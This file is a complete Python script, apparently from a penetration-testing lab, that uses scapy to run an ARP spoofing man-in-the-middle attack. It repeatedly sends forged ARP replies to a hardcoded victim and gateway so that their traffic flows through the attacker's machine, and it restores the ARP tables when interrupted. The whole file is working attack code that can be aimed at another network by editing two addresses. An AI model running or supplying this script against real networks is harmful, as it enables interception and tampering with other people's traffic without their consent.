#!/usr/bin/env python3

import scapy.all as scapy
import time


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # creates an arp request with given ip
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # makes a broadcast frame
    arp_request_broadcast = broadcast / arp_request  # combines arp request and broadcast frame to send on network
    (answered_list, unanswered_list) = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)  # sends and receive our packets

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # forging an ARP packet, and spoofing the source IP of the packet.
    # 0) creating a 'response' packet == op=2) target machine = pdst; 2) mac of target machine = hwdst; 3) IP of the router/gateway = psrc
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_clients(destination_ip, source_ip):
    # 0) creating a 'response' packet == op=2) target machine = pdst; 2) mac of target machine = hwdst; 3) IP of the router/gateway = psrc
    # 4) source mac address the victim had originally
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.20.130"
gateway_ip = "192.168.20.2"

sent_packet_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)  # tell victim PC kali machine is the gateway
        spoof(gateway_ip, target_ip)  # tell gateway kali machine is victim PC
        sent_packet_count += 2
        print("\r[*] Number of sent packets: " + str(sent_packet_count), end="")
        time.sleep(2)

except KeyboardInterrupt:
    restore_clients(target_ip, gateway_ip)
    restore_clients(gateway_ip, target_ip)
    print("\n[+] Ctrl + C pressed --> Program has been stopped and client have been returned to original state")




#get_mac("192.168.20.2")

# print(packet.show())
# print(packet.summary())
